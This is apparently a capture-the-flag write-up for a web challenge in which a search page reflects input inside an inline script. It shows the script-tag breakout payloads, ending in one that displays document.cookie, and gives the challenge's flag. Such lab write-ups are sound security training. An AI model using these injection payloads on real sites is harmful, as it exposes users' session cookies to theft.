# Challenge Name:
 [* Searching for the cookie*](https://cybertalents.com/challenges/web/searching-for-the-cookie)
 
# Challenge Description
simple search website we need to know which cookie to eat ;)

Link: [http://34.77.37.110/searching-cookie/](http://34.77.37.110/searching-cookie/)

## Answer
* Try write "<script>alert(2)</script>" in the textbox nothing will happen
* Open source code in new tab (ctrl + u)
```html
<script>var currentSearch = {'keyword':'you searched for: <script>alert(2)</script>'};</script>
```
* Now we want to close first script tag then open new one for alert, try it in the textbox
```html
</script> <script>alert(2)</script> 
```
* It works, so now try that but with cookies
```html
</script><script>alert(document.cookie)</script> 
```
* You got the Flag!!

 ## The Flag
 > coolcookie112
